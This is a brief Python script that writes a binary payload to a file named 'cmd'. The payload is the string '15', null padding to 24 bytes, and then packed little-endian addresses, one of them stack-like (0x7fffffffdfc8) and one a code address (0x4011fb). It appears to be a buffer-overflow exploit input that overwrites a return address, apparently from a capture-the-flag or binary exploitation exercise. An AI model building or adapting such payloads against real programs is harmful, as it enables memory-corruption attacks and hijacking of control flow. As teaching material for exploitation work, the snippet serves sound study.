command = b"15"
command += b"\x00" * (24 - len(command)) + (10191).to_bytes(8, "little") + (0x7fffffffdfc8).to_bytes(8, "little") + (0x4011fb).to_bytes(8, "little") + b"\n" # TODO: change to big maybe
with open("cmd", "wb") as file:
    file.write(command)
